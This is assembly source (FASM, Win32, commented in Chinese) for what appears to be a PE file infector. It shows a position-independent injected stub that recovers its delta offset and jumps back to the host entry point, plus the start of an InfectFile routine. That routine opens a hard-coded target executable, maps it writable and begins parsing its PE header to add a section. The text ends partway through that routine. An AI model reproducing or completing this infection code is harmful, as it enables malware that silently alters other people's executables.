
  format PE GUI 4.0
  include 'win32ax.inc'

;##########
InfectFile    proto    :dword
;#########
.code

;###############插入代码############################
VStart:
        call    abc
abc:        pop    ebp
        sub    ebp,offset abc
        xor    eax,eax
        add    eax,[ebp+HostEntry]
        jmp    eax
HostEntry    dd    ?
VEnd:
;######################################################

filename    db    "f:/a.exe" ;添加目标文件
write        db    0


;################添加节的操作过程###########################
InfectFile    proc    _filename:dword
        local hFile
        local hMapping    
        local pMapping    
        local @dwAddCodeFile
        local @dwAddCodeBase
        local @dwEntry
;#######################打开文件##########################################################
        invoke    CreateFile,_filename,\
        GENERIC_READ+GENERIC_WRITE,\
        FILE_SHARE_READ+FILE_SHARE_WRITE,\
        NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
        .if eax == INVALID_HANDLE_VALUE
            jmp    exit2
        .endif
        mov    hFile,eax
        invoke    CreateFileMapping,hFile,NULL,PAGE_READWRITE,0,0,0
        mov    hMapping,eax
        invoke    MapViewOfFile,hMapping,FILE_MAP_READ+FILE_MAP_WRITE,0,0,0 
        mov    pMapping,eax        
;########################找到pe头#########################################################
        mov    esi,eax 
        assume    esi:ptr    IMAGE_DOS_HEADER

